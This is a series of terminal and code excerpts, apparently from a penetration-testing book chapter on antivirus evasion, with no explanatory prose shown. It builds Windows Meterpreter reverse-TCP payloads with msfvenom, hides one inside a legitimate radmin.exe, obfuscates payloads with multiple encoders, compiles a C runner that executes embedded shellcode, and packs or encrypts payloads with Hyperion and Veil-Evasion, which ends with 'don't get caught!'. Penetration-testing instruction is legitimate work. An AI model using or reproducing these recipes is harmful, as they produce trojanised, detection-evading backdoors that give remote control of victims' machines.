["```\nroot@kali:~# **msfvenom -h**\nUsage: /opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val>\n\nOptions:\n    -p, --payload    [payload]       Payload to use. Specify a '-' or stdin to\n                                      use custom payloads\n--*snip*--\n  ❶-x, --template   [path]           Specify a custom executable file to use\n                                       as a template\n  ❷-k, --keep                        Preserve the template behavior and inject\n                                      the payload as a new thread\n--*snip*--\n```", "```\nroot@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe**\n```", "```\nroot@kali:~# **md5sum /usr/share/windows-binaries/radmin.exe**\n❶2d219cc28a406dbfa86c3301e8b93146  /usr/share/windows-binaries/radmin.exe\n\nroot@kali:~# **md5sum radmin.exe**\n❷4c2711cc06b6fcd300037e3cbdb3293b  radmin.exe\n```", "```\nroot@kali:~# **sha512sum /usr/share/windows-binaries/radmin.exe**\n5a5c6d0c67877310d40d5210ea8d515a43156e0b3e871b16faec192170acf29c9cd4e495d2e03b8d\n7ef10541b22ccecd195446c55582f735374fb8df16c94343  /usr/share/windows-binaries/radmin.exe\nroot@kali:~# **sha512sum radmin.exe**\nf9fe3d1ae405cc07cd91c461a1c03155a0cdfeb1d4c0190be1fb350d43b4039906f8abf4db592b060\nd5cd15b143c146e834c491e477718bbd6fb9c2e96567e88  radmin.exe\n```", "```\nroot@kali:~# **msfvenom -l encoders**\nFramework Encoders\n==================\n\n    Name                          Rank       Description\n    ----                          ----       -----------\n    cmd/generic_sh                good       Generic Shell Variable Substitution Command Encoder\n    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder\n--*snip*—\n  ❶x86/shikata_ga_nai             excellent  Polymorphic XOR Additive Feedback Encoder\n--*snip*--\n```", "```\nroot@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > meterpreterencoded.exe**\n[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)\n[*] x86/shikata_ga_nai succeeded with size 344 (iteration=2)\n--*snip*--\n[*] x86/shikata_ga_nai succeeded with size 533 (iteration=9)\n[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)\n```", "```\nroot@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f raw**❶ **> meterpreterencoded.bin**❷\n[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)\n--*snip*--\n[*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)\nroot@kali:~# **msfvenom -p -**❸ **-f exe -a x86**❹ **--platform windows**❺ **-e x86/bloxor -i 2 > meterpretermultiencoded.exe < meterpreterencoded.bin**❻\n[*] x86/bloxor succeeded with size 638 (iteration=1)\n[*] x86/bloxor succeeded with size 712 (iteration=2)\n```", "```\nroot@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -e x86/shikata_ga_nai -i 10 -f exe > radminencoded.exe**\n```", "```\n#include <stdio.h>\nunsigned char random[]= ❶\n\nunsigned char shellcode[]= ❷\n\nint main(void) ❸\n{\n        ((void (*)())shellcode)();\n}\n```", "```\nroot@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f c -e x86/shikata_ga_nai -i 5**\nunsigned char buf[] =\n\"\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n--*snip*--\n\"\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\"\n\"\\x85\\xf6\\x75\\xec\\xc3\";\n```", "```\nroot@kali:~# **cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512**\ns0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adL\n--*snip*--\n```", "```\n#include <stdio.h>\nunsigned char random[]= \"s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adLqB-3X7MCSL9SuqlChqT6zQkoZNvi9YEWq4ec8\n-ajdsJW7s-yZOKHQXMTY0iuawscx57e7Xds15GA6rGObF4R6oILRwCwJnEa-4vrtCMYnZiBytqtrrHkTeNohU4gXcVIem\n-lgM-BgMREf24-rcW4zTi-Zkutp7U4djgWNi7k7ULkikDIKK-AQXDp2W3Pug02hGMdP6sxfR0xZZMQFwEF-apQwMlog4Trf5RTHFtrQP8yismYtKby15f9oTmjauKxTQoJzJD96sA-7PMAGswqRjCQ3htuWTSCPleODITY3Xyb1oPD5wt-G1oWvavrpeweLERRN5ZJiPEpEPRTI62OB9mIsxex3omyj10bEha43vkerbN0CpTyernsK1csdLmHRyca\";\n\nunsigned char shellcode[]= \"\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n\"\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\"\n\"\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85\"\n\"\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\\x01\\xd3\\xe3\"\n\"\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d\"\n\"\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58\"\n\"\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\"\n\"\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\"\n\"\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xeb\\x86\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"\n\"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\"\n\"\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\"\n\"\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\"\n\"\\x05\\x68\\x0a\\x00\\x01\\x09\\x68\\x02\\x00\\x09\\x29\\x89\\xe6\\x6a\\x10\"\n\"\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\"\n\"\\x08\\x75\\xec\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x6a\\x00\\x6a\\x04\\x56\"\n\"\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\"\n\"\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\"\n\"\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\"\n\"\\x85\\xf6\\x75\\xec\\xc3\";\n\nint main(void)\n{\n        ((void (*)())shellcode)();\n}\n```", "```\nroot@kali:~# **i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c**\n```", "```\nroot@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe > meterpreter.exe**\nroot@kali:~# **cd Hyperion-1.0/**\nroot@kali:~/Hyperion-1.0# **wine ../hyperion ../meterpreter.exe bypassavhyperion.exe**❶\n\nOpening ../bypassav.exe\nCopied file to memory: 0x117178\n--*snip*--\n\nExecuting fasm.exe\n\nflat assembler  version 1.69.31\n5 passes, 0.4 seconds, 92672 bytes.\n```", "```\nroot@kali:~/Veil-Evasion-master# **./Veil-Evasion.py**\n========================================================================\n Veil-Evasion | [Version]: 2.6.0\n========================================================================\n [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework\n========================================================================\n\n Main Menu\n\n    28 payloads loaded\n\n Available commands:\n\n    use         use a specific payload\n    info        information on a specific payload\n    list        list available payloads\n    update      update Veil to the latest version\n    clean       clean out payload folders\n    checkvt     check payload hashes vs. VirusTotal\n    exit        exit Veil\n```", "```\n[>] Please enter a command: **list**\nAvailable payloads:\n    1)    auxiliary/coldwar_wrapper\n    2)    auxiliary/pyinstaller_wrapper\n\n--*snip*--\n\n    22)    python/meterpreter/rev_tcp\n    ❶23)    python/shellcode_inject/aes_encrypt\n    24)    python/shellcode_inject/arc_encrypt\n    25)    python/shellcode_inject/base64_substitution\n    26)    python/shellcode_inject/des_encrypt\n    27)    python/shellcode_inject/flat\n    28)    python/shellcode_inject/letter_substitution\n```", "```\n[>] Please enter a command: **23**\n\nPayload: python/shellcode_inject/aes_encrypt loaded\n\n Required Options:\n\n Name            Current Value    Description\n ----            -------------    -----------\n❶compile_to_exe  Y                Compile to an executable\n expire_paylo    X                Optional: Payloads expire after \"X\" days\n❷inject_method   Virtual          Virtual, Void, Heap\n use_pyherion    N                Use the pyherion encrypter\n\n Available commands:\n\n    set             set a specific option value\n    info            show information about the payload\n    generate        generate payload\n    back            go to the main menu\n    exit            exit Veil\n```", "```\n[?] Use msfvenom or supply custom shellcode?\n\n        1 - msfvenom (default)\n        2 - Custom\n\n [>] Please enter the number of your choice: **1**\n\n [*] Press [enter] for windows/meterpreter/reverse_tcp\n [*] Press [tab] to list available payloads\n [>] Please enter metasploit payload:\n [>] Enter value for 'LHOST', [tab] for local IP: **192.168.20.9**\n [>] Enter value for 'LPORT': **2345**\n [>] Enter extra msfvenom options in OPTION=value syntax:\n\n [*] Generating shellcode...\n [*] Press [enter] for 'payload'\n [>] Please enter the base name for output files: **meterpreterveil**\n\n [?] How would you like to create your payload executable?\n\n        1 - Pyinstaller (default)\n        2 - Py2Exe\n\n [>] Please enter the number of your choice: **1**\n--*snip*--\n [*] Executable written to: /root/veil-output/compiled/meterpreterveil.exe\n\n Language:    python\n Payload:    AESEncrypted\n Shellcode:    windows/meterpreter/reverse_tcp\n Options:    LHOST=192.168.20.9  LPORT=2345\n Required Options:    compile_to_exe=Y  inject_method=virtual  use_pyherion=N\n Payload File:    /root/veil-output/source/meterpreterveil.py\n Handler File:    /root/veil-output/handlers/meterpreterveil_handler.rc\n\n [*] Your payload files have been generated, don't get caught!\n [!] And don't submit samples to any online scanner! ;)\n```"]